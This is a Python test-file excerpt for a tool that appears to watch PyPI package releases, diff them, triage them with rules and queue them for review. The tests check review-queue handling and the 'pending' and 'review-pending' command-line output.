def test_an_exhausted_rebuild_the_current_rules_clear_drops_its_unreviewed_verdict(tmp_path, monkeypatch):
    cfg, conn, rid = _queued_off(tmp_path)
    _fetch(monkeypatch, fetcher.MetadataGone("pkg: PyPI metadata returned 404"))
    rvw = reviewer.Reviewer(cfg, backend=_Backend())
    for _ in range(cfg.reviewer.max_review_attempts + 1):
        orchestrator.drain_pending(cfg, conn, rvw, auto=True)
    assert conn.execute("SELECT model FROM verdicts WHERE release_id=?", (rid,)).fetchall()[0][0] == "none"
    assert conn.execute("SELECT count(*) FROM alerts").fetchone()[0] == 1
    _fetch(monkeypatch, _art({"setup.py": _PLAIN_SETUP, "pkg/mod.py": b"X = 1\n"}))    # nothing fires today
    be = _Backend()
    orchestrator.drain_pending(cfg, conn, reviewer.Reviewer(cfg, backend=be), auto=False)
    assert store.get_stage(conn, "pkg", "1.1") == "triaged" and be.calls == []
    assert conn.execute("SELECT count(*) FROM verdicts WHERE release_id=? AND model='none'", (rid,)).fetchone()[0] == 0
    assert conn.execute("SELECT count(*) FROM alerts").fetchone()[0] == 1


# --- the CLI ------------------------------------------------------------------------------------------------------

def test_pending_lists_each_queued_release_once_and_the_oldest_50(tmp_path, monkeypatch, capsys):
    cfg, conn, rid, rvw = _setup(tmp_path, _Backend(fail=TimeoutError("timed out")), max_review_attempts=1)
    _queue_disabled(conn, rid)
    ex = store.record_release(conn, "exhausted", "1.0", 2, False, None, "sdist")
    store.update_stage(conn, ex, "triaged", _T.score, json.dumps([r.__dict__ for r in _T.fired_rules]))
    orchestrator._review_escalated(cfg, conn, rvw, dataclasses.replace(_diff(), package="exhausted"), _T, ex)
    out = _pending_cli(cfg, monkeypatch, capsys)
    assert f"  release_id={rid}  pkg==1.0.0  score=60  waiting: reviewer_disabled" in out
    assert out.count("exhausted==1.0") == 1 and "exhausted==1.0  (not scanned: review_failed)" in out   # once
    for i in range(54):
        _queue_disabled(conn, store.record_release(conn, f"q{i}", "1.0", 10 + i, False, None, "sdist"))
    seen = []
    real = orchestrator.store.connect

    def traced(c):
        conn = real(c)
        conn.set_trace_callback(seen.append)
        return conn
    monkeypatch.setattr(orchestrator.store, "connect", traced)
    out = _pending_cli(cfg, monkeypatch, capsys)
    assert len([ln for ln in out.splitlines() if ln.startswith("  release_id=")]) == 50
    assert "  … and 5 more (oldest first)" in out
    assert any("NOT EXISTS" in q and q.endswith("LIMIT 50") for q in seen)


def test_review_pending_takes_reason_reviewer_disabled_and_drains_only_that_reason(tmp_path, monkeypatch, capsys):
    cfg, conn, rid, _ = _setup(tmp_path, _Backend())
    _queue_disabled(conn, rid)
    other = store.record_release(conn, "other", "1.0", 2, False, None, "sdist")
    store.park_for_review(conn, other, "endpoint_unreachable", "down",
                          reviewer.build_review_input(_diff(), _T, max_chars=cfg.reviewer.max_input_chars))
    monkeypatch.setattr(fetcher, "fetch_artifacts",
                        lambda c, rel, **k: _art() if rel.package == "pkg" else None)
    monkeypatch.setattr(differ, "build_diff", lambda art, *_: _diff())
    monkeypatch.setattr(engine, "triage", lambda *a, **k: _T)
    be = _Backend()
    monkeypatch.setattr(orchestrator, "_build_reviewer", lambda c: reviewer.Reviewer(c, backend=be))
    monkeypatch.setattr(cli, "_cfg", lambda args: cfg)
    monkeypatch.setattr(cli.egress, "install_guard", lambda cfg: None)
    monkeypatch.setattr(sys, "argv", ["pydiffwatch", "review-pending", "--reason", "reviewer_disabled"])
    cli.main()
    assert "reviewed 1 queued release(s); still queued: endpoint_unreachable: 1" in capsys.readouterr().out
    assert len(be.calls) == 1 and store.get_stage(conn, "pkg", "1.0.0") == "reviewed"
